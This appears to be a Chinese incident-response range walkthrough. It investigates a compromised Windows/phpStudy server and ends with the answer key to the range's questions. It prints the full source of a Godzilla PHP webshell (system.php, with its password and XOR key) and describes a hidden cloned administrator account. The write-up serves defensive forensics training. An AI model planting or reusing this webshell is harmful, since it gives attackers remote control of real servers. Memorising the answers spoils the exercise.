:::info

前景需要：小李在某单位驻场值守，深夜12点，甲方已经回家了，小李刚偷偷摸鱼后，发现安全设备有告警，于是立刻停掉了机器开始排查。

这是他的服务器系统，请你找出以下内容，并作为通关条件：

1.攻击者的IP地址（两个）？

2.攻击者的webshell文件名？

3.攻击者的webshell密码？

4.攻击者的伪QQ号？

5.攻击者的伪服务器IP地址？

6.攻击者的伪服务器端口？

7.攻击者是如何入侵的（选择题）？

8.攻击者的隐藏用户名？

::::

启动靶机，打开`phpstudy`

### 查杀webshell

首先将网站源码打包，用D盾查杀

![image-20240601180403229](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240601180403229.png)

`system.php`

```php
<?php
@session_start();
@set_time_limit(0);
@error_reporting(0);
function encode($D,$K){
    for($i=0;$i<strlen($D);$i++) {
        $c = $K[$i+1&15];
        $D[$i] = $D[$i]^$c;
    }
    return $D;
}
$pass='hack6618';
$payloadName='payload';
$key='7813d1590d28a7dd';
if (isset($_POST[$pass])){
    $data=encode(base64_decode($_POST[$pass]),$key);
    if (isset($_SESSION[$payloadName])){
        $payload=encode($_SESSION[$payloadName],$key);
        if (strpos($payload,"getBasicsInfo")===false){
            $payload=encode($payload,$key);
        }
		eval($payload);
        echo substr(md5($pass.$key),0,16);
        echo base64_encode(encode(@run($data),$key));
        echo substr(md5($pass.$key),16);
    }else{
        if (strpos($data,"getBasicsInfo")!==false){
            $_SESSION[$payloadName]=encode($data,$key);
        }
    }
}
```

一个哥斯拉的🐎，密码是`hack6618`

### 查看apache的日志

搜索`system.php`

```
192.168.126.135 - - [29/Feb/2024:13:02:00 +0800] "GET /system.php HTTP/1.1" 200 -
192.168.126.135 - - [29/Feb/2024:13:08:49 +0800] "POST /system.php HTTP/1.1" 200 -
```

得到攻击者IP，`192.168.126.135`

### 查看windows日志

利用windows日志工具

![image-20240601181231571](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240601181231571.png)

得到用户名`hack887$`，登录ip`192.168.126.129`

删除用户失败

![image-20240601181527501](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240601181527501.png)

控制面板寻找账户并未发现

猜测该用户为克隆administrator隐藏用户，注册表寻找该用户

找到隐藏账户`hack887$`

![image-20240601181618810](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240601181618810.png)

删除该项以及3E8

在文档内发现Tencent Files文件夹，猜测使用过通讯工具

![image-20240601181747537](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240601181747537.png)

伪QQ号`777888999321`

在`FileRecv`文件夹内为接收的文件

![image-20240601181851712](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240601181851712.png)

发现伪造的ip和端口

256.256.66.88

65536

### 通关

:::note

1.攻击者的IP地址（两个）？ 192.168.126.135 192.168.126.129

2.攻击者的webshell文件名？system.php

3.攻击者的webshell密码？hack6618

4.攻击者的伪QQ号？777888999321

5.攻击者的伪服务器IP地址？256.256.66.88

6.攻击者的伪服务器端口？65536

7.攻击者是如何入侵的（选择题）？ftp攻击，先爆破登上ftp服务，利用ftp上传system.php,拿到webshell

8.攻击者的隐藏用户名？hack887$

:::



![image-20240601175442338](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240601175442338.png)